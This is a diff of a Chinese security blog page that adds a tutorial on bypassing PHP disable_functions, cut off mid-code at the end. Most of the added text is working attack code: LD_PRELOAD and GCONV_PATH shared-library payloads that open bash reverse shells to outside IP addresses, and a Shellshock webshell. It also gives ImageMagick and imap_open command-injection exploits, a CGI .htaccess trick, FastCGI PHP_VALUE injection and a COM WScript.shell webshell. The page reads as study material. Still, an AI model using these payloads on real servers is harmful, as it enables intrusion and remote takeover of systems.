@@ -16,17 +16,20 @@
   <meta name="author" content="Zer0peach">
   <meta name="keywords" content="">
   
-    <meta name="description" content="网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个.antproxy.php,问了hurrison说是反制蚁剑连接的。 也就是说没办法蚁剑连接。查看权限，发现只有&#x2F;var&#x2F;www&#x2F;html 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。">
+    <meta name="description" content="disable_function与open_basedir这两个一直不知道是什么，今天我们来了解一下，并看看他们的bypass disable_functiondisable_function是php.ini的一个设置选项，可以用来设置php环境禁止使用某些函数， （eval在php中不属于函数，因此disable_function对它不起作用） bypass disable_function突破">
 <meta property="og:type" content="article">
 <meta property="og:title" content="disable_function">
 <meta property="og:url" content="https://zer0peach.github.io/2023/09/06/disable-function/index.html">
 <meta property="og:site_name" content="Zer0peach can&#39;t think">
-<meta property="og:description" content="网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个.antproxy.php,问了hurrison说是反制蚁剑连接的。 也就是说没办法蚁剑连接。查看权限，发现只有&#x2F;var&#x2F;www&#x2F;html 是0755权限没有写文件权限，而其他路径都是0的权限，这道题势必要getshell执行系统命令才行了。">
+<meta property="og:description" content="disable_function与open_basedir这两个一直不知道是什么，今天我们来了解一下，并看看他们的bypass disable_functiondisable_function是php.ini的一个设置选项，可以用来设置php环境禁止使用某些函数， （eval在php中不属于函数，因此disable_function对它不起作用） bypass disable_function突破">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163700318.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163759470.png">
 <meta property="article:published_time" content="2023-09-06T10:29:06.000Z">
-<meta property="article:modified_time" content="2023-09-17T03:37:08.594Z">
+<meta property="article:modified_time" content="2023-11-13T06:43:22.520Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/disable-function/image-20231102163700318.png">
   
   
   
@@ -231,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          800 字
+          25k 字
         
       </span>
     
@@ -242,7 +245,7 @@
         
         
         
-          7 分钟
+          213 分钟
         
       </span>
     
@@ -284,7 +287,661 @@
             
               <div class="markdown-body">
                 
-                <p>网上搜了一下，大概考点应该是disable_function绕过，网上给的脚本大多是先通过蚁剑连接再上传so文件进行绕过。但是查看了一下网站根目录，发现一个<code>.antproxy.php</code>,问了hurrison说是反制蚁剑连接的。</p>
+                <h1 id="disable-function与open-basedir"><a href="#disable-function与open-basedir" class="headerlink" title="disable_function与open_basedir"></a>disable_function与open_basedir</h1><p>这两个一直不知道是什么，今天我们来了解一下，并看看他们的bypass</p>
+<h2 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h2><p>disable_function是php.ini的一个设置选项，可以用来设置php环境禁止使用某些函数，</p>
+<p>（eval在php中不属于函数，因此disable_function对它不起作用）</p>
+<h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><p><a target="_blank" rel="noopener" href="https://ph0ebus.cn/post/%E7%AA%81%E7%A0%B4disable_functions%E9%99%90%E5%88%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.html">突破disable_function限制执行命令 · ph0ebus’s Blog</a></p>
+<p>这位师傅也是很厉害的（最近看到师傅新文章中挺多都是我计划要学的，嘻嘻），文章也写很好</p>
+<h2 id="利用LD-PRELOAD环境变量"><a href="#利用LD-PRELOAD环境变量" class="headerlink" title="利用LD_PRELOAD环境变量"></a>利用LD_PRELOAD环境变量</h2><p>查找php.ini中是否有遗漏的危险函数</p>
+<div class="code-wrapper"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>,passthru,<span class="hljs-keyword">exec</span>,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,pcntl_exec</code></pre></div>
+
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>讨论 LD_PRELOAD 前，先了解程序的链接。所谓链接，也就是说编译器找到程序中所引用的函数或全局变量所存在的位置。一般来说，程序的链接分为静态链接和动态链接。静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数库。所以，对于动态链接来说，必然需要一个动态链接库。动态链接库的好处在于，一旦动态库中的函数发生变化，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、发布，对于程序的维护产生了比较大的工作量。</p>
+<p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
+<p>通过 ldd 命令可查看程序或者库文件所依赖的共享库列表，一般情况下，其加载顺序为</p>
+<div class="code-wrapper"><pre><code class="hljs arcade">LD_PRELOAD &gt; LD_LIBRARY_PATH &gt; <span class="hljs-regexp">/etc/</span>ld.so.cache &gt; <span class="hljs-regexp">/lib &gt; /u</span>sr/lib</code></pre></div>
+
+<h3 id="劫持函数"><a href="#劫持函数" class="headerlink" title="劫持函数"></a>劫持函数</h3><p>通过<code>putenv()</code>函数将LD_PRELOAD设置为指定恶意动态链接库(.so)文件路径，利用其<strong>加载优先级高</strong>劫持任意函数执行的内容</p>
+<p>这里以 mail() 为例，mail 函数是一个发送邮件的函数，当使用到这玩意儿发送邮件时会使用到系统程序<code>/usr/sbin/sendmail</code>，我们如果能劫持到 sendmail 触发的函数，那么就可以达到执行任意系统命令的目的了。</p>
+<p>可以使用<code>readelf -Ws /usr/sbin/sendmail</code>命令查看 sendmail 命令可能调用的库函数，<code>strace -f</code>可查看具体执行过程中调用的函数，这里拿 <code>geteuid()</code> 函数为例</p>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;
+	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/101.42.xx.xx/23333 0&gt;&amp;&quot;</span>);
+&#125;
+
+<span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;
+	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; 
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    &#125;
+    <span class="hljs-comment">// 还原函数调用关系，用函数 unsetenv() 解除</span>
+    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>); /
+    <span class="hljs-built_in">payload</span>();
+&#125;</code></pre></div>
+
+<p>将 c 编译为动态链接库</p>
+<div class="code-wrapper"><pre><code class="hljs angelscript">gcc hack.c -<span class="hljs-keyword">shared</span> -fPIC -o hack.so</code></pre></div>
+
+<p>然后执行php函数</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/hack.so&quot;</span>); <span class="hljs-comment">// 编译.c文件后的.so文件位置</span>
+    <span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>与此类似的php函数还有error_log()和mb_send_mail()</p>
+<div class="code-wrapper"><pre><code class="hljs lisp">error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span>
+mb_send_mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<span class="hljs-comment">;</span></code></pre></div>
+
+<h4 id="预加载共享对象"><a href="#预加载共享对象" class="headerlink" title="预加载共享对象"></a>预加载共享对象</h4><p>系统通过LD_PRELOAD预先加载共享对象，如果在加载时就执行代码，就不用劫持函数以此绕过disable_function。GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数。</p>
+<div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+__attribute__ ((constructor)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span> <span class="hljs-params">()</span></span>&#123;
+    <span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);
+    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/118.89.61.71/7777 &lt;&amp;1&#x27;&quot;</span>);
+&#125;</code></pre></div>
+
+<h2 id="利用GCONV-PATH环境变量-需要两个文件"><a href="#利用GCONV-PATH环境变量-需要两个文件" class="headerlink" title="利用GCONV_PATH环境变量  (需要两个文件)"></a>利用GCONV_PATH环境变量  (需要两个文件)</h2><p>GCONV_PATH能够使glibc使用用户自定义的<code>gconv_modules</code>文件。<code>gconv_modules</code>文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个<code>.so</code>文件中，即<code>gconv_modules</code>文件提供了各个字符集的<code>.so</code>文件所在位置</p>
+<p>PHP的iconv函数的第一个参数是字符集的名字，这个参数会传递到glibc的<code>iconv_open</code>函数的参数中，<code>iconv_open</code>函数依照<code>GCONV_PATH</code>找到<code>gconv_modules</code>文件的知识找到参数对应的<code>.so</code>文件，然后调用.so文件中的<code>gconv()</code>和<code>gconv_init()</code></p>
+<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">gconv</span><span class="hljs-params">()</span>&#123;
+&#125;
+
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">gconv_init</span><span class="hljs-params">()</span>&#123;
+    system(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxxx/xxxx 0&gt;&amp;1&#x27;&quot;</span>);
+&#125;</code></pre></div>
+
+<p>编译为so文件</p>
+<div class="code-wrapper"><pre><code class="hljs c">gcc <span class="hljs-built_in">exp</span>.c -shared -fPIC -o <span class="hljs-built_in">exp</span>.so</code></pre></div>
+
+<p>可写目录创建gconv_modules文件</p>
+<div class="code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//PAYLOAD为字符集名称</span>
+module  PAYLOAD<span class="hljs-comment">//  INTERNAL     /tmp/exp    2</span>
+module  INTERNAL   PAYLOAD<span class="hljs-comment">//    /tmp/exp    2</span>
+
+    
+<span class="hljs-comment">//exp为字符集名称</span>
+module  <span class="hljs-built_in">exp</span><span class="hljs-comment">//  INTERNAL     /tmp/exp    2</span>
+module  INTERNAL   <span class="hljs-built_in">exp</span><span class="hljs-comment">//    /tmp/exp    2</span></code></pre></div>
+
+<p>然后php代码触发</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);    
+    <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;payload&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>, <span class="hljs-string">&quot;whatever&quot;</span>);    <span class="hljs-comment">//第一个为对应的字符集名称</span>
+<span class="hljs-meta">?&gt;</span>
+
+
+<span class="hljs-meta">&lt;?php</span>
+	<span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>);
+	<span class="hljs-title function_ invoke__">iconv_strlen</span>(<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);      <span class="hljs-comment">//第二个为对应的字符集名称</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;GCONV_PATH=/tmp/&quot;</span>); 
+    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;php://filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so&#x27;</span>);
+    <span class="hljs-comment">//定义的字符集名称放在iconv后面</span>
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="利用-ShellShock-（env解析为函数）"><a href="#利用-ShellShock-（env解析为函数）" class="headerlink" title="利用 ShellShock   （env解析为函数）"></a>利用 ShellShock   （env解析为函数）</h2><p>该方法利用的Bash Shellshock 破壳漏洞（CVE-2014-6271）</p>
+<ul>
+<li>php &lt; 5.6.2</li>
+<li>bash &lt;&#x3D; 4.3</li>
+</ul>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
+<p>命令行输入<code>env x=&#39;() &#123; :;&#125;; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如果输出了<code>vulnerable</code>，则说明存在bash破壳漏洞</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123; 
+	
+	<span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span>
+   
+   <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>); 
+   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>); 
+   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);
+   
+   <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span>
+   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span>
+   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span>
+   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span>
+   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span>
+   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span>
+   
+   
+   
+   <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>); 
+   @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>); 
+   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span> != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>; 
+   <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; 
+&#125; 
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shellshock</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); 
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_flag=() &#123; :; &#125;; ls / &gt; /tmp/t.txt&quot;</span>);
+<span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p>
+<p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。</p>
+<p>若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下：</p>
+<div class="code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI
+AddHandler cgi-script .<span class="hljs-keyword">ant</span></code></pre></div>
+
+<p>由于CGI程序可以执行命令，那我们可以利用CGI来执行系统命令绕过disable_functions。</p>
+<p>上传shell.ant</p>
+<div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span>
+<span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">type</span>: text/html
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>
+<span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">id</span></code></pre></div>
+
+<h2 id="FastCGI-PHP-FPM"><a href="#FastCGI-PHP-FPM" class="headerlink" title="FastCGI&#x2F;PHP-FPM"></a>FastCGI&#x2F;PHP-FPM</h2><p>FastCGI，它每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。</p>
+<p>FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM。FPM按照CGI的协议将TCP流解析成真正的数据。由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和FPM进行通信。于是就有了利用 Webshell 直接与 FPM 通信 来绕过 disable functions 的姿势。</p>
+<p>通过PHP-FPM的环境变量<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>设置php.ini配置项，通过配置项<code>auto_prepend_file</code>和<code>auto_append_file</code>结合<code>php://input</code>包含任意php代码并执行，并且修改了远程文件包含选项<code>allow_url_include</code>为on</p>
+<div class="code-wrapper"><pre><code class="hljs 1c">&#123;
+    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,
+    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,
+    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,
+    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,
+    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,
+    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,
+    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,
+    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,
+    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,
+    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,
+    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,
+    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,
+    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;
+    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,
+    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;
+&#125;</code></pre></div>
+
+<h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><p>在 ImageMagick 的默认配置文件 &#x2F;etc&#x2F;ImageMagick&#x2F;delegates.xml 里可以看到所有的委托。这个文件定义了很多占位符，比如 %i 是输入的文件名，%l 是图片exif label信息。而在后面 command 的位置，%i 和 %l 等占位符被拼接在命令行中。这个漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号或闭合双引号，来执行任意命令。如果在phpinfo中看到有这个ImageMagick，可以尝试一下</p>
+<ul>
+<li>Imagemagick &lt; 6.9.3-10</li>
+<li>Imagemagick &lt; 7.0.1-1</li>
+<li>PHP &gt;&#x3D; 5.4</li>
+</ul>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;
+
+<span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+    <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;
+&#125;
+
+<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span>
+<span class="hljs-string">push graphic-context</span>
+<span class="hljs-string">viewbox 0 0 640 480</span>
+<span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span>
+<span class="hljs-string">pop graphic-context</span>
+<span class="hljs-string">EOF</span>;
+
+<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);
+<span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();
+<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);
+<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);
+<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();
+<span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();
+<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);
+<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="imap-open-绕过"><a href="#imap-open-绕过" class="headerlink" title="imap_open()绕过"></a>imap_open()绕过</h2><ul>
+<li>安装了imap扩展</li>
+<li>imap.enable_insecure_rsh选项为On。</li>
+</ul>
+<p>imap_open函数在将邮箱名称传递给rsh或ssh命令之前没有正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，可以发送包含<code>-oProxyCommand</code>参数的恶意IMAP服务器名称来利用此漏洞</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); 
+<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;imap_open&#x27;</span>)) &#123; 
+	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no imap_open function!&quot;</span>); 
+&#125; 
+<span class="hljs-variable">$server</span> = <span class="hljs-string">&quot;x -oProxyCommand=echo\t&quot;</span> . <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>] . <span class="hljs-string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="hljs-string">&quot;|base64\t-d|sh&#125;&quot;</span>; 
+<span class="hljs-comment">//$server = &#x27;x -oProxyCommand=echo$IFS$()&#x27; . base64_encode($_GET[&#x27;cmd&#x27;] .&quot;&gt;/tmp/cmd_result&quot;) . &#x27;|base64$IFS$()-d|sh&#125;&#x27;; </span>
+<span class="hljs-title function_ invoke__">imap_open</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span> . <span class="hljs-variable">$server</span> . <span class="hljs-string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>); <span class="hljs-comment">// or</span>
+<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;nnError: &quot;</span>.<span class="hljs-title function_ invoke__">imap_last_error</span>()); 
+<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">5</span>); 
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/tmp/cmd_result&quot;</span>); 
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<h2 id="Windows组件COM绕过"><a href="#Windows组件COM绕过" class="headerlink" title="Windows组件COM绕过"></a>Windows组件COM绕过</h2><p>COM component（COM组件）是微软开发的软件开发技术。其实质是一些小的二进制可执行程序，它们可以给应用程序，操作系统以及其他组件提供服务。而在php中如果想要引用第三方动态库，需要通过 <code>new COM(“Component.class”)</code> 的方法来实现，其中的 Component 必须是COM组件</p>
+<ul>
+<li>要求 <code>com.allow_dcom = true</code></li>
+<li>目标服务器为Windows系统</li>
+<li>在php&#x2F;ext&#x2F;目录下存在php_com_dotnet.dll这个文件</li>
+</ul>
+<p><code>com.allow_dcom</code>默认是不开启的，PHP 7版本开始要自己添加扩展<code>extension=php_com_dotnet.dll</code></p>
+<p>创建一个COM对象,通过调用COM对象的<code>exec</code>替我们执行命令</p>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$wsh</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wsh&#x27;</span>] : <span class="hljs-string">&#x27;wscript&#x27;</span>;
+<span class="hljs-keyword">if</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;wscript&#x27;</span>) &#123;
+    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
+    <span class="hljs-variable">$wshit</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">COM</span>(<span class="hljs-string">&#x27;WScript.shell&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Create Wscript.Shell Failed!&quot;</span>);
+    <span class="hljs-variable">$exec</span> = <span class="hljs-variable">$wshit</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;cmd /c&quot;</span>.<span class="hljs-variable">$command</span>);
+    <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$exec</span>-&gt;<span class="hljs-title function_ invoke__">StdOut</span>();
+    <span class="hljs-variable">$stroutput</span> = <span class="hljs-variable">$stdout</span>-&gt;<span class="hljs-title function_ invoke__">ReadAll</span>();
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$stroutput</span>;
+&#125;
+<span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$wsh</span> == <span class="hljs-string">&#x27;application&#x27;</span>) &#123;
+    <span class="hljs-variable">$command</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];
